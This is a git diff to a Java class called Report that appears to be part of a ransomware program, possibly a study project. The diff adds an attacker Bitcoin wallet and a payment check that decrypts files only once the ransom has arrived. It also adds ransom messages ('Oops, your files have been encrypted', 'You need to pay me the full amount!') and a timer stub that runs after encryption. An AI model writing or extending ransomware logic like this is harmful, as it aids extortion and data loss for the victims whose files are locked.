@@ -1,5 +1,7 @@
 package report;
 
+import blockchain.Wallet;
+
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.GCMParameterSpec;
@@ -30,9 +32,16 @@ public class Report implements IReport{
     private File directory;
     private double ransomAmount;
 
+    // Attacker
+    private final Wallet wallet;
+    private final double initialBalance;
+
 
     public Report() {
         this.isEncrypted = false;
+
+        this.wallet = new Wallet();
+        initialBalance = wallet.getBalance();
 
         // Path of dedicated directory
         this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
@@ -47,9 +56,14 @@ public class Report implements IReport{
 
     @Override
     public void checkPayment() throws Exception {
-
-        System.out.println("transaction successful! Your files will be decrypted.");
-        startDecryption();
+        System.out.println("angreifer:" + wallet.getBalance());
+        if(wallet.getBalance() >= (this.initialBalance + ransomAmount)) {
+            System.out.println("transaction successful! Your files will be decrypted.");
+            startDecryption();
+        } else {
+            System.out.println("You need to pay me the full amount!");
+            System.out.println("To decrypt your files, I need " + (ransomAmount - wallet.getBalance()) + " more BTC!");
+        }
     }
 
     @Override
@@ -78,6 +92,9 @@ public class Report implements IReport{
             //}
 
             isEncrypted = true;
+
+            startTimer();
+
             System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
         }
     }
@@ -146,6 +163,9 @@ public class Report implements IReport{
         return bFile;
     }
 
+    private void startTimer() {
+
+    }
 
 
     public double getRansomAmount() {
@@ -154,5 +174,9 @@ public class Report implements IReport{
 
     public void setRansomAmount(double ransomAmount) {
         this.ransomAmount = ransomAmount;
+    }
+
+    public Wallet getWallet() {
+        return wallet;
     }
 }
